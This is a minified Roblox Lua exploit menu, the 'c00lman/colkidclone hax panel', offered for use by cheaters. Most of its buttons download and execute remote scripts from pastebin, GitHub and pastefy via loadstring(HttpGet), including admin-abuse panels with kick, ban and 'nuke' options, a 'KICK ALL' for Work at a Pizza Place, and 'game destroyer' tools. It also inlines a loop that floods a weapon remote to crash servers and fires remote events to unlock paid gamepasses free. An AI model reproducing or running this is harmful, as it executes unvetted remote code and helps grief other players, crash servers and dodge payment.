--discord.gg/boronide, code generated using luamin.js™



local a=loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()local a=a.CreateLib("c00lman/colkidclone hax panel","Ocean")local b=a:NewTab("Credits/Info")local c=b:NewSection("Made By C00LMAN Scripts made by")local c=b:NewSection("Harked Options : PandaExploits#3098")local c=b:NewSection("Destructed_Hex's GUI Scripts : Luca and luq")local b=b:NewSection("quirkyCMD adm : ____")local b=a:NewTab("GUIS ABUSIVE")local b=b:NewSection("Scripts For Hacking")b:NewButton("Harked V2","Harked With Kick Kill Ban Blockhead BlockChar ETC",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/JxcExploit/Harkedv2-script/main/Leaked-v2hardked"))()end)b:NewButton("Destruction_Hex's GUI","Harked But With more options like Shutodwn Nuke ETC",function()loadstring(game:HttpGet("https://pastebin.com/raw/S28p8fN9"))()end)b:NewButton("QuirkyCmd","The Best ADM Script",function()loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()end)b:NewButton("Bring GUI","a simple bring script",function()loadstring(game:HttpGet(('https://pastebin.com/raw/iThJgCAS'),true))()end)b:NewButton("Nameless Admin","Universal GOOD Admin Script",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()end)b:NewButton("Infinite Yeld Admin","OLD AND GOOD ADMIN",function()loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()end)b:NewButton("R15 TO R6","Animations r15 to animations r6",function()loadstring(game:HttpGet(('https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua'),true))()end)b:NewButton("Parkour","heh",function()loadstring(game:HttpGet(('https://pastefy.app/6HAb8rAj/raw'),true))()end)b:NewButton("Punch","PUNCH THE GUY U HATE",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fedoratums/Base-Script/Base-Script/fedoratum punch fling",true))()end)b:NewButton("(cook burgers 100ppl only) Cooked","Harked Vcooked",function()loadstring(game:HttpGet("https://pastebin.com/raw/LMWCkgnm"))()end)b:NewButton("Cook Burgers GUI","T",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/NOOBARMYSCRIPTER/NOOBARMYSCRIPTER/main/cook%20burgers"))()end)b:NewButton("GIGACHAD HUB","(gigachad very giga warning)",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/OWJBWKQLAISH/GigaChad-Hub/main/Protected_3038811338432694.lua.txt"))()end)b:NewButton("Invisible","bye bye",function()loadstring(game:HttpGet("https://pastebin.com/raw/K0khSQFN"))()end)b:NewButton("Animation PACK","/e pack frfrfrfr",function()loadstring(game:HttpGet("https://pastebin.com/raw/tcTds0ky"))()end)b:NewButton("B2S ADM GUI","adm btools and much move to troll (also have kick)",function()loadstring(game:HttpGet("https://pastebin.com/raw/jEUmUnQC"))()end)b:NewButton("tool rotator","rerereeeeeeeeeeeeeeeeeeeeeeeeeeee",function()loadstring(game:HttpGet(('https://pastebin.com/raw/dkufMsdA'),true))()end)b:NewButton("Game Hub V5","lots of fun",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()end)b:NewButton("AUDIO BREAKER","dont work all games",function()loadstring(game:HttpGet("https://pastebin.com/raw/JmQMG0ct"))()end)b:NewButton("Destruction Game Destroyer","dont work all games",function()setclipboard("https://www.roblox.com/games/6550894018/Destruction-Game")game:GetService("StarterGui"):SetCore("SendNotification",{Title="GAME",Text="only work in the game copyied in clipboard",Icon="rbxassetid://1234567890"})loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/Destruction%20Game"))()end)b:NewButton("Free gamepass","l robux",function()loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/6982de484735e730494b2d5a10fd6a2a/raw/a92563b0cd6a63683341a09f54baccea5349ed69/feGamepassV2",true))()end)b:NewButton("unchor gui","hehehhe",function()loadstring(game:HttpGet("https://pastebin.com/raw/ShnqV5Vr",true))()end)local b=a:NewTab("F3X GAMES")local b=b:NewSection("Scripts For Hacking")b:NewButton("Exploit1.Form.Exe","hax ss fe bypass fe disabler fe joifb",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/fggdfgbdrtgbdrt/Exploit1.Form.Exe/main/Exploit1.Form.Exe"))()end)b:NewButton("c00lkidd f3x","f3x destruction",function()loadstring(game:HttpGet("https://pastebin.com/raw/Dyh2BUeu"))()end)local b=a:NewTab("FE SCRIPTS")local c=b:NewSection("Fun")c:NewButton("Chat Art","art can bypass chat also btw",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/omegachadgaming/mongus/main/main.lua",true))()end)c:NewButton("Multi Gears","GEAR CHAOS",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/MultiToolsV1/main/script"))()end)c:NewButton("FREE OBBY GAMEPASS","-1 everytime u execute robux",function()for a,a in pairs(game:GetDescendants())do if a.ClassName=="RemoteEvent"then if a.Parent.Name=="WeaponsRemotes"or a.Parent.Name=="VipRemotes"or a.Parent.Name=="Remotes"then a:FireServer()end end end end)c:NewButton("Walk On Walls","spiodermanse",function()loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()end)c:NewTextBox("flood escape crasher (crash ammount)","crash game",function(a)game:GetService("StarterGui"):SetCore("SendNotification",{Title="HOW TO DO IT",Text="1st grab gun and the switch the crash trigger... enjoy :D",Icon="rbxassetid://1234567890"})game:GetService("StarterGui"):SetCore("SendNotification",{Title="CREDITS",Text="https://scriptblox.com/u/Tomato",Icon="rbxassetid://1234567890"})game:GetService("StarterGui"):SetCore("SendNotification",{Title="CREDITS",Text="https://scriptblox.com/u/Tomato",Icon="rbxassetid://1234567890"})local a=a;local b=game:GetService("RunService")local b=game:GetService("Players").LocalPlayer.Character;local c=game:GetService("Players").LocalPlayer.Backpack;local d=loadstring(game:HttpGet("https://pastebin.com/raw/eKwyeQa0",true))()local e=d:CreateTab("Crash Script",true)getgenv().crash=false;workspace.svcl_com.ShopExtra:FireServer("BRAINSAW")local d=d:MakeToggle(e,"Crash Toggle",false,function(a)local a=a.Text;if a=="ON"then crash=true else crash=false end end)local c=c:WaitForChild("BRAINSAW").Pew;while wait()do if crash==true then local b=b.Head.Position;for a=1,a,1 do c:FireServer(b)end end end end)c:NewButton("HD ADMIN ABUSIVE","admen",function()game:GetService("StarterGui"):SetCore("SendNotification",{Title="pls",Text="for more cmds say ;customcmds",Icon="rbxassetid://1234567890"})loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/showcases/main/fedoratumadmin",true))()end)c:NewButton("PART UNACHORED MOVER","/e move",function()loadstring(game:HttpGet(('https://pastefy.app/Vcuyg09O/raw'),true))()end)c:NewButton("ZOMBIE FLING","",function()loadstring(game:HttpGet(('https://pastefy.app/w7KnPY70/raw'),true))()end)c:NewButton("control npcs","",function()loadstring(game:HttpGet(('https://pastefy.app/x8nWWq0M/raw'),true))()end)local b=b:NewSection("work at a pizza place")b:NewButton("COOK ROOM DUCKER","room dies",function()loadstring(game:HttpGet("https://pastebin.com/raw/PMCUVLj0"))()end)b:NewButton("COOK ROOM DUCKER OFF","room dies",function()loadstring(game:HttpGet("https://pastebin.com/raw/pFFf3Tcf"))()end)b:NewButton("GUI WAAP","room dies",function()loadstring(game:HttpGet("https://pastebin.com/raw/7Q5sN2wY",true))()end)b:NewButton("AUDIO PLAYER FE","room dies",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/pizza-place-audio-player/main/script"))()end)b:NewButton("MANAGER COMMAND","room dies",function()spawn(loadstring(game:HttpGet("https://pastebin.com/raw/q817HYb9",true)))end)b:NewButton("KICK ALL","room dies",function()loadstring(game:HttpGet('https://raw.githubusercontent.com/Hydro4Music/Others/main/WorkAtPizzaPlaceKickAll'))()end)local b=a:NewTab("Brookhaven Rp 🏡")local b=b:NewSection("Scripts For Hacking")b:NewButton("R15 TO R6","Animations r15 to animations r6",function()loadstring(game:HttpGet(('https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua'),true))()end)b:NewButton("Redz Hub","hub",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB"))()end)b:NewButton("Ice Hub","hub",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()end)b:NewButton("tb","tttt",function()loadstring(game:HttpGet("https://pastefy.app/tIiioko4/raw"))()end)local b=a:NewTab("Fake Executors")local b=b:NewSection("Executors")b:NewButton("RC7","EXPLOIT",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/rc7"))()end)b:NewButton("Krnl","EXPLOIT",function()loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/krnlnoui.lua"))()end)b:NewButton("Synapse X","EXNOTPLOIT",function()loadstring(game:HttpGet("https://pastebin.com/raw/2qjBZB1Y"))()end)local b=a:NewTab("Barrys Prison")local c=b:NewSection("Morphs (execute gamepass)")c:NewButton("Free Gamepass","free gamepass gears",function()for a,a in pairs(game:GetDescendants())do if a.ClassName=="RemoteEvent"then if a.Parent.Name=="WeaponsRemotes"or a.Parent.Name=="VipRemotes"or a.Parent.Name=="Remotes"then a:FireServer()end end end end)c:NewButton("Become Barrys","BRRYS NOT BARRYS",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(164.482285,107.406891,-20.2540112,-0.392119616,-4.18371542e-08,-0.919914246,-5.41307841e-12,1,-4.54770976e-08,0.919914246,-1.78274835e-08,-0.392119616)end)c:NewButton("Become Pizza Guy (not mario)","pizza",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(95.4371109,104.737022,-20.1365261,0.999057412,4.13396783e-09,-0.0434087291,-3.30724857e-12,1,9.51574464e-08,0.0434087291,-9.50676053e-08,0.999057412)end)c:NewButton("Become Police But a Doll Ugly","ugly",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(108.916046,106.567535,-18.5824261,-0.979165018,3.85838117e-09,0.203066275,3.97604172e-09,1,1.71468756e-10,-0.203066275,9.75296177e-10,-0.979165018)end)c:NewButton("Become Funni Ugly Doll","ugly",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(136.070724,107.01152,-20.4083557,-0.103358306,-8.48401849e-10,-0.994644165,3.80977194e-10,1,-8.92559415e-10,0.994644165,-4.71190198e-10,-0.103358306)end)c:NewButton("Enable Jump","Enable Jumps for morphs",function()game.Players.LocalPlayer.Character.Humanoid.JumpPower=50 end)local b=b:NewSection("Tps")b:NewButton("Prision tp","/etp",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(-2.19999719,103.197998,-43.3999939,1,0,0,0,1,0,0,0,1)end)b:NewButton("lvl 4 tp","Ye",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(-25.8886013,103.197998,-76.470108,0.999480724,2.88266513e-08,0.0322222672,-3.04456904e-08,1,4.97553536e-08,-0.0322222672,-5.07105469e-08,0.999480724)end)b:NewButton("Gamepass Place","Ye",function()game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=CFrame.new(105.225609,103.19799,-69.9990387,-0.998112321,4.39675052e-09,0.0614152141,3.23092197e-09,1,-1.90820373e-08,-0.0614152141,-1.88475884e-08,-0.998112321)end)local a=a:NewTab("Animations")local a=a:NewSection("🥚")a:NewButton("2007 animations","OLD ANIMATIONS",function()loadstring(game:HttpGet("https://pastebin.com/raw/SPfYLTyK"))()end)a:NewButton("custom sit animation",";sit",function()loadstring(game:HttpGet("https://pastefy.app/XKxQtK2K/raw"))()end)a:NewButton("Upsidedown","/e flip",function()game:GetService("StarterGui"):SetCore("SendNotification",{Title="Upside Down Note :";Text="You Cant See This Script But Other Players In Server Can.";Icon=""})Duration=5;loadstring(game:HttpGet("https://raw.githubusercontent.com/HeyGyt/upsidedown/main/main"))()end)